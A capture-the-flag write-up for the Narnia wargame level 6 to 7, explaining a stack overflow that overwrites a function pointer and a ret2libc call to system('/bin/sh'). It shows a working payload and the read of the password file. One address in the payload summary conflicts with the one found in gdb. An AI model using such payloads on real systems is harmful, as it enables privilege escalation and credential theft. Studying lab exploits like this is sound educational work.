## 6 -> 7

### Writeup

The source code is a bit confusing for this challenge, but it essentially stores a function pointer to `puts()` from libc in `fp`, then calls it on `argv[1]` after clearing the arguments and environmental variables.

Looking through the code, we can see that there are two `strcpy` calls to buffers that are used for `fp()`. This suggests that our vulnerability is a stack-based buffer overflow, but we first need to figure out what we can do with this vulnerability.

The first thing I did was to try and figure out where `fp` was stored in the stack, as if we can overflow onto that pointer, we can control where the program jumps to and execute our own code. To do this, I started by disassembling the `main` function in gdb.

```
0x0804931c <+313>: mov    -0xc(%ebp),%eax
0x0804931f <+316>: call   *%eax
0x08049321 <+318>: add    $0x4,%esp
0x08049324 <+321>: push   $0x1
0x08049326 <+323>: call   0x8049080 <exit@plt>
End of assembler dump.
```

Since we know `fp()` is the last function called in `main`, `fp` must be the value stored in the register `%eax`. We can see where on the stack the value in `eax` is stored by setting a breakpoint at `*main+316` and then running `x/x $eax`, revealing it to be stored at the address `0x8049070`.

```
(gdb) x/x $eax
0x8049070 <puts@plt>: 0xb23425ff
```

This is crucial information, as when we look at the stack, we see that it is stored at a higher address than the buffers, meaning that we can overflow into this pointer.

```
(gdb) x/10x $esp
0xffffd378:  0xffffd384  0x42424242  0xffffff00  0x41414141
0xffffd388:  0xf7fbb400  0x08049070  0x00000003  0xf7fa7e34
0xffffd398:  0x0804b128  0xf7d97f5c
```

Highlighted is the address of the `fp` pointer’s value on the stack when we give the program the input `AAAA BBBB`. This reveals that to overwrite the `fp` pointer, the payload would be in `argv[1]`: eight `A`s, then the address we want.

Now that we know how to craft the payload, how do we actually run malicious code? First, since we don’t have the space to store our own shellcode, we need to understand what ret2libc is. Ret2libc is changing the return address to be a function that is in the libc library. This would allow us to call the function `system("bin/sh")` to spawn a shell with higher privileges, becoming `narnia7`.

To start this, we need to find the function `system()`’s address, which we can do using gdb: `p system`. This reveals that it is stored at `0xf7dc5cc0`. Knowing this, we now know our two payloads:

```
Argv[1] = 8xA + 0xf7fc5cc0
Argv[2] = 8xB + "/bin/sh"
```

```
narnia6@narnia:~$ /narnia/narnia6 `echo -e "AAAAAAAA\xc0\x5c\xdc\xf7" "BBBBBBBB/bin/sh"`
$ whoami
narnia7
$ cat /etc/narnia_pass/narnia7
Hwsfol90tt
$
```

<details>
  <summary>Flag</summary>Hwsfol90tt
</details>